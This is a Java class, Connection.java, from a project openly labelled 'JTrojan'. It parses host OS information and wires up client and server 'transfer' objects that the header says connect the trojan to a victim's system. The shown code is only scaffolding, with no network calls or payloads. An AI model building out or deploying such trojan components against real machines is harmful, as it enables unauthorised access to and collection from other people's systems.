/**
 * @Description:        Connection class would to connect our trojan to client OS
 * @Author:             Quentin Le Bian <quentpilot>
 * @Email:              quentin.lebian@pilotaweb.fr
 * @Project:            JTrojan
 * @About:              You're welcome to hack and code as your are each of theses sources files <3:p|--<;
 * @Filename:           Connection.java
 * @Date:               2017-10-19T15:26:15+02:00
 * @Last modified by:   quentpilot
 * @Last modified time: 2017-10-21T15:08:04+02:00
 * @License:            MIT
 * @See:                projects.quentinlebian.fr/JTrojan
 */


package Trojan.Connect;

import Trojan.Install.Infos;
import Trojan.Tools.Parser;
import Trojan.Transfert.ITransfert;
import Trojan.Transfert.ClientTransfert;
import Trojan.Transfert.ServerTransfert;

public class Connection {

    /**
    * This attribute would to transfert
    * Client OS infos
    *
    * @see ClientTransfert#get()
    * @see ClientTransfert#update()
    */
    protected ClientTransfert       cTransfert = new ClientTransfert();

    /**
    * This attribute would to transfert
    * Client OS infos
    *
    * @see ServerTransfert#get()
    * @see ServerTransfert#update()
    */
    protected ServerTransfert       sTransfert = new ServerTransfert();

    /**
    * This attribute would to store
    * OS infos parsed to resources/infos/os.json
    *
    * @see Connection#run()
    * @see Connection#getInfos()
    */
    protected Infos       infos = null;

    /**
    * Main Connection constructor
    *
    * @see Connection#run()
    */
    public             Connection(){}

    /**
    * This method would to start user connection
    *
    * @return Success or not
    *
    * @see Connection#infos
    */
    public boolean      run() {
        Parser parser = new Parser();
        this.infos = parser.getData()[0];
        return true;
    }

      /**
      * This method would to get current transfert data
      *
      * @see ITransfert#get()
      */
      public void         get() {
        cTransfert.get();
        sTransfert.get();
      }

      /**
      * This method would to update transfert data
      *
      * @see ITransfert#update()
      */
      public void         update() {
        cTransfert.update();
        sTransfert.update();
      }

      /**
      * This method would to get current OS infos
      *
      * @return current infos data class
      *
      * @see Connection#infos
      * @see Connection#run()
      */
      public Infos        getInfos() {
          return this.infos;
      }

      /**
      * This method would to get current
      * Client Transfert informations
      *
      * @return current client transfert data
      *
      * @see Connection#get()
      * @see Connection#update()
      * @see Connection#cTransfert
      */
      public ClientTransfert        getCTransfert() {
          return this.cTransfert;
      }

      /**
      * This method would to get current
      * Server Transfert informations
      *
      * @return current server transfert data
      *
      * @see Connection#get()
      * @see Connection#update()
      * @see Connection#sTransfert
      */
      public ServerTransfert        getSTransfert() {
          return this.sTransfert;
      }
}
